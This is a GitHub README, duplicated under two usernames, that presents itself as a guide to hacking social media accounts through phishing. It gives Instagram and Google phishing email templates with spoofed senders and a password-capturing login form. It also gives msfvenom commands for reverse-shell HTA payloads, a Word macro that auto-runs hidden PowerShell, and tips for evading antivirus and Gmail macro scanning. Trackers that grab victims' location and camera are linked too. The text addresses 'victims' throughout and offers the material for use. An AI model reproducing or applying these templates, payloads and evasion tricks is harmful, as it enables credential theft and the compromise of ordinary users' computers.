# -Mmeso-hue-hacking-social-media-account-
[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2FMmeso-hue%2F-Mmeso-hue-hacking-social-media-account-.svg?type=shield)](https://app.fossa.com/projects/git%2Bgithub.com%2FMmeso-hue%2F-Mmeso-hue-hacking-social-media-account-?ref=badge_shield)


Navigation Menu
Sign in
mmeso_hue
/
Hacking-Social_Media-Accounts
Public
🪝Hacking Social Media Accounts by using Phishing Mails (GoPhish) 🐬

bento.me/mmeso_hue
 50 stars  8 forks  Branches  Tags  Activity
Code
Issues
Pull requests
mmeso-hue/Hacking-Social_Media-Accounts
Folders and files
Name	
Latest commit
mmeso-hue 
mmeso-hue 
mmeso-hue 
mmeso-hue 
2 weeks ago
History
Fack-reCaptcha-Phishing/recaptcha-phish
4 months ago
Landing-Login-Page
10 months ago
Phishing-Mail
2 years ago
Google_Dorks.md
7 months ago
IP-Logger.php
7 months ago
MSF-Persistence-Backdoor.md
5 months ago
README.md
2 weeks ago
Stupid.mp3
11 months ago
Tracking_IP_Address.md
7 months ago
Repository files navigation
README
Hacking-Social_Media-Accounts
Hacking Social Media Accounts with Phishing Tool (GoPhish) 🐟

Screenshot_2024-03-02-23-51-55-769_com google android youtube

mmeso-hue 

⚠️ NOTICE:
🫵🏼 First time here? huh ( ≖‿ ≖ )🔪

Don't forget to hit the star button ⭐️ up there! I keep updating this repo with more phishing-related stuff over time

so be sure to show some love!🩸🫶🏽

※ If this tricks helps you, then don’t forget to share this repo with other! Hackers :)
1

gophish-templates
Templates for an open-source Phishing Toolkit Some very basic configurations and templates to provide clean layouts usable in GoPhish, an open-source phishing toolkit. These layouts provided will also work with any other phising service as well, though they have only been tested in GoPhish.

GoPhish

Installation ⚓
Installing the files is easy. Download the GoPhish client and log in at https://127.0.0.1:3333/ with the standard credentials visible in the command line. There, the various templates and landing pages can be configured with my html configurations.

Features 🎣
Instagram Landing Page
Instagram Mail Template
Instagram Landing Page 💈
A very basic Instagram landing page which attempts to have people enter user details.

Link: https://www.instagram.com/accounts/login/
Title: Login • Instagram

instagrampage

Instagram Mail Template 💈
A very basic Instagram mail which attempts to have people click on a link to secure their account.

Subject: New Instagram Login
Sender: security@mail.instagram.com

instagrammail

Google Chrome OS Mail Template 💈
1

A very basic Google mail, which notifies the user about a login.

Subject: New Sign In
Sender: no-reply@accounts.google.com

chromemail

Free web port Forwarding...
port-Forwarding

Just 👇 run this command ₊˚🎐
ssh -R 80:localhost:8080 nokey@localhost.run
http://localhost.run/
green

Q/A ❓
Q1 Submitted Form Data Isn't Being Captured (o_O)?
To capture data submitted through a landing page, you need to create an HTML

element on your landing page that has a few specific properties: Here is a minimal example element which captures data:
<form action="" method="POST">
    <input name="username" type="text" placeholder="username" />
    <input name="password" type="password" placeholder="password" />
    <input type="submit" value="Submit" />
</form>

There are a few things to note about this form:
The action is "" so that form submissions are directed to your phishing page and, therefore, to your Gophish server
The form submission method is POST
Each input which you expect to see in Gophish has a name attribute
Each of these should be checked when troubleshooting HTML forms that don't appear to be sending data correctly. If you still aren't seeing your form submitted correctly, you may need to review and remove any Javascript on the page interfering with the form submission. Finally, ensure that when saving the landing page that you have both the "Capture Submitted Data" and "Capture Passwords" (if appropriate) options checked. Otherwise, Gophish will remove the name attributes from your inputs so they aren't submitted with the form.

Q2 How i setup Phishing Campaing ? ¯_(ツ)_/¯
You can read this article to get more information about how to set up a phishing campaign!

https://www.hackercoolmagazine.com/gophish-setup-a-phishing-campaign/
How to Compromise Windows 🦋 system
You can add this payload to your phishing email. When the victim installs & open this malicious file, you'll get your shell 🐚

HTA Attack in Action
We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.

msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil64.hta
Exploiting Microsoft Windows using MS Word Macro [ Manually ] 🐓
The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.

Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.

Create the .doc file
Use the base64 powershell code from revshells.com
Used this code to inline macro(Paste the code from revshells in str variable) :

str = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

n = 50

for i in range(0, len(str), n):
    print "Str = Str + " + '"' + str[i:i+n] + '"'
Sub AutoOpen()

  MyMacro

End Sub

Sub Document_Open()

  MyMacro

End Sub

Sub MyMacro()

    Dim Str As String

   <b>Paste the script output here!<b>

    CreateObject("Wscript.Shell").Run Str

End Sub
Exploiting Microsoft Windows using MS Word Macro [Automation Script] 🪿
If the thought of manually crafting a macro exploit seems feels like a headache then This tool simplifies the process, which automatically generate MW word macros which contain's your RCE payload code.

Minitrue

git clone https://github.com/X0RW3LL/Minitrue.git
cd /opt/WindowsMacros/Minitrue
./minitrue
select a payload: windows/x64/shell_reverse_tcp
select the payload type: VBA Macro
LHOST=$yourIP
LPORT=$yourPort
Payload encoder: None
Select or enter file name (without extensions): hacker
Malicious Macros Generators
https://github.com/cldrn/macphish
https://github.com/cedowens/Mythic-Macro-Generator
Pro tip ♦️:
You can put a password on your payload file to bypass Windows antivirus. 🔍

When the victim receives your email containing an attachment, the attachment is a password-protected spreadsheet or MS Word file. Make sure you provide a password in your phishing email. When Your target downloads 📩 the file and then enters the password to open it . your malicious payload is executed on their computer!

because antivirus software is not able to scan your malicious file, as it is encrypted and password-protected.🔐 Antiviruses are designed to scan for malicious behavior. Not to crack the password protected file, LoL.

1

Disclaimer
The files in this repository were created and modified by me, for my own personal use and come with no guarantee to work for you. I provide these files "as-is" and offer no support whatsoever to get them working. A lot of these files use terrible formatted and layered tables, anyone working with email and newsletter designs knows how painful they can be, and how worse it is to reverse-engineer those.🦆

How you Bypass Gmail macro restrictions
You can bypass gmail scanning for potentially malicious macros by converting Microsoft Word (.docx) or Excel (.xlsx) files into PDF format before sending them via email. Then, you suggest informing the recipient (Target) to convert the file back to its original format in order to use it.

IMG_20240217_110508

While PDF files are generally considered safer than Word or Excel files in terms of macro-based attacks, they are not immune to security risks. PDF files can contain other types of malicious content, such as embedded links or JavaScript-based attacks.

OSINT (Open-source Intelligence)
※ https://inteltechniques.com/tools/Username.html 🔎 Freely available online open source investigation toolkit.🕵️‍♂️

OSINT

https://docs.google.com/spreadsheets/d/18rtqh8EG2q1xBo2cLNyhIDuK9jrPGwYr9DI2UncoqJQ/edit?pli=1#gid=1700243466

Navigation Menu

Sign in
DevVj-1
/
Hacking-Social_Media-Accounts
Public
🪝Hacking Social Media Accounts by using Phishing Mails (GoPhish) 🐬

bento.me/dev-vijay
 50 stars  8 forks  Branches  Tags  Activity
 Star
Notifications
Code
Issues
Pull requests

DevVj-1/Hacking-Social_Media-Accounts

 main

Code

Folders and files
Name	
Latest commit

DevVj-1
History

Fack-reCaptcha-Phishing/recaptcha-phish
Landing-Login-Page
Phishing-Mail
Google_Dorks.md
IP-Logger.php
MSF-Persistence-Backdoor.md
README.md
Stupid.mp3
Tracking_IP_Address.md
Repository files navigation
README

Hacking-Social_Media-Accounts
Hacking Social Media Accounts with Phishing Tool (GoPhish) 🐟





⚠️ NOTICE:
🫵🏼 First time here? huh ( ≖‿ ≖ )🔪

Don't forget to hit the star button ⭐️ up there! I keep updating this repo with more phishing-related stuff over time

so be sure to show some love!🩸🫶🏽

※ If this tricks helps you, then don’t forget to share this repo with other! Hackers :)


gophish-templates
Templates for an open-source Phishing Toolkit Some very basic configurations and templates to provide clean layouts usable in GoPhish, an open-source phishing toolkit. These layouts provided will also work with any other phising service as well, though they have only been tested in GoPhish.



Installation ⚓
Installing the files is easy. Download the GoPhish client and log in at https://127.0.0.1:3333/ with the standard credentials visible in the command line. There, the various templates and landing pages can be configured with my html configurations.

Features 🎣
Instagram Landing Page
Instagram Mail Template
Instagram Landing Page 💈
A very basic Instagram landing page which attempts to have people enter user details.

Link: https://www.instagram.com/accounts/login/
Title: Login • Instagram



Instagram Mail Template 💈
A very basic Instagram mail which attempts to have people click on a link to secure their account.

Subject: New Instagram Login
Sender: security@mail.instagram.com



Google Chrome OS Mail Template 💈


A very basic Google mail, which notifies the user about a login.

Subject: New Sign In
Sender: no-reply@accounts.google.com



Free web port Forwarding...


Just 👇 run this command ₊˚🎐
ssh -R 80:localhost:8080 nokey@localhost.run
http://localhost.run/


Q/A ❓
Q1 Submitted Form Data Isn't Being Captured (o_O)?
To capture data submitted through a landing page, you need to create an HTML

element on your landing page that has a few specific properties: Here is a minimal example element which captures data:
<form action="" method="POST">
    <input name="username" type="text" placeholder="username" />
    <input name="password" type="password" placeholder="password" />
    <input type="submit" value="Submit" />
</form>

There are a few things to note about this form:
The action is "" so that form submissions are directed to your phishing page and, therefore, to your Gophish server
The form submission method is POST
Each input which you expect to see in Gophish has a name attribute
Each of these should be checked when troubleshooting HTML forms that don't appear to be sending data correctly. If you still aren't seeing your form submitted correctly, you may need to review and remove any Javascript on the page interfering with the form submission. Finally, ensure that when saving the landing page that you have both the "Capture Submitted Data" and "Capture Passwords" (if appropriate) options checked. Otherwise, Gophish will remove the name attributes from your inputs so they aren't submitted with the form.

Q2 How i setup Phishing Campaing ? ¯_(ツ)_/¯
You can read this article to get more information about how to set up a phishing campaign!

https://www.hackercoolmagazine.com/gophish-setup-a-phishing-campaign/
How to Compromise Windows 🦋 system
You can add this payload to your phishing email. When the victim installs & open this malicious file, you'll get your shell 🐚

HTA Attack in Action
We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.

msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil64.hta
Exploiting Microsoft Windows using MS Word Macro [ Manually ] 🐓
The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.

Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.

Create the .doc file
Use the base64 powershell code from revshells.com
Used this code to inline macro(Paste the code from revshells in str variable) :

str = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

n = 50

for i in range(0, len(str), n):
    print "Str = Str + " + '"' + str[i:i+n] + '"'
Sub AutoOpen()

  MyMacro

End Sub

Sub Document_Open()

  MyMacro

End Sub

Sub MyMacro()

    Dim Str As String

   <b>Paste the script output here!<b>

    CreateObject("Wscript.Shell").Run Str

End Sub
Exploiting Microsoft Windows using MS Word Macro [Automation Script] 🪿
If the thought of manually crafting a macro exploit seems feels like a headache then This tool simplifies the process, which automatically generate MW word macros which contain's your RCE payload code.

Minitrue

git clone https://github.com/X0RW3LL/Minitrue.git
cd /opt/WindowsMacros/Minitrue
./minitrue
select a payload: windows/x64/shell_reverse_tcp
select the payload type: VBA Macro
LHOST=$yourIP
LPORT=$yourPort
Payload encoder: None
Select or enter file name (without extensions): hacker
Malicious Macros Generators
https://github.com/cldrn/macphish
https://github.com/cedowens/Mythic-Macro-Generator
Pro tip ♦️:
You can put a password on your payload file to bypass Windows antivirus. 🔍

When the victim receives your email containing an attachment, the attachment is a password-protected spreadsheet or MS Word file. Make sure you provide a password in your phishing email. When Your target downloads 📩 the file and then enters the password to open it . your malicious payload is executed on their computer!

because antivirus software is not able to scan your malicious file, as it is encrypted and password-protected.🔐 Antiviruses are designed to scan for malicious behavior. Not to crack the password protected file, LoL.



Disclaimer
The files in this repository were created and modified by me, for my own personal use and come with no guarantee to work for you. I provide these files "as-is" and offer no support whatsoever to get them working. A lot of these files use terrible formatted and layered tables, anyone working with email and newsletter designs knows how painful they can be, and how worse it is to reverse-engineer those.🦆

How you Bypass Gmail macro restrictions
You can bypass gmail scanning for potentially malicious macros by converting Microsoft Word (.docx) or Excel (.xlsx) files into PDF format before sending them via email. Then, you suggest informing the recipient (Target) to convert the file back to its original format in order to use it.



While PDF files are generally considered safer than Word or Excel files in terms of macro-based attacks, they are not immune to security risks. PDF files can contain other types of malicious content, such as embedded links or JavaScript-based attacks.

OSINT (Open-source Intelligence)
※ https://inteltechniques.com/tools/Username.html 🔎 Freely available online open source investigation toolkit.🕵️‍♂️



https://docs.google.com/spreadsheets/d/18rtqh8EG2q1xBo2cLNyhIDuK9jrPGwYr9DI2UncoqJQ/edit?pli=1#gid=1700243466
https://map.malfrats.industries/
🌐 A Beginner's Guide to Social Media Verification 📌

https://www.bellingcat.com/resources/2021/11/01/a-beginners-guide-to-social-media-verification/
※ Username searching...🔍

https://whatsmyname.app/
Tracking via phishing links...


https://github.com/thewhiteh4t/seeker
※ Online Alternative ※

Popular online Tracker tools

Create a Tracker Link : https://grabify.link/

Create a Tracker Link : https://tracker.iplocation.net/

Telegram BOT 🎯💯:- @Camera_location_sf1_bot



You can Hack:

🎯 Front Camera 📷

🎯 exact Location with map 📍

🎯 Phone number

🎯 Sim Type

🎯 IP, Battery, and many more...

Q) What is baiting technique? Baiting is a variant of social engineering where the perpetrator lures the victim with attractive offers or rewards. This tactic tricks the victim into unintentionally downloading malware into their system or revealing confidential personal or organizational information



How do you Track an Email Address?
I assume that many of you are wondering how is it possible to trace an email address and find the location of an email? a email header contains a lot of information about the email itself as well as the sender!📌

How To Copy Email Header ❓

https://it.umn.edu/services-technologies/how-tos/gmail-view-email-headers
( Copy full email header from any email that you would like to trace back and find email sender location)

https://www.ip-tracker.org/email/finder.php
How do you Track an Suspicious IP address
You can easily lookup, track and find IP location. Simple enter the IP address or domain into input box to start finding its location, as well as additional relevant IP or DNS information.

https://www.ip-tracker.org/
Geolocation Investigation maps (OSINT)
Allows you to search for mapped information in the Open Street Map database using command-line queries, making it an unrivalled geolocation tool.

Map: https://overpass-turbo.eu/
Guide: https://publication.osintambition.org/3-ways-to-use-overpass-turbo-if-you-dont-know-overpass-query-language-2f748b0fb66b
Image geolocation Investigation with AI tool
This tool looks at things like plants, building styles, and weather in the picture and compares them to a large collection of photos that have known locations.

Geospy: https://geospy.ai/


Meterpreter as Persistence Backdoor 💀⃤


MSF-Persistence-Backdoor:
Metasploit Unleashed: More Hacking Tricks and commands 👁️⃤


⚜ Proactive Cyber Security Roadmap in just 4 steps📌🌎
Link: https://medium.com/@devvijay7113/proactive-cyber-security-roadmap-in-just-4-steps-1d8e60ade989



## License
[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2FMmeso-hue%2F-Mmeso-hue-hacking-social-media-account-.svg?type=large)](https://app.fossa.com/projects/git%2Bgithub.com%2FMmeso-hue%2F-Mmeso-hue-hacking-social-media-account-?ref=badge_large)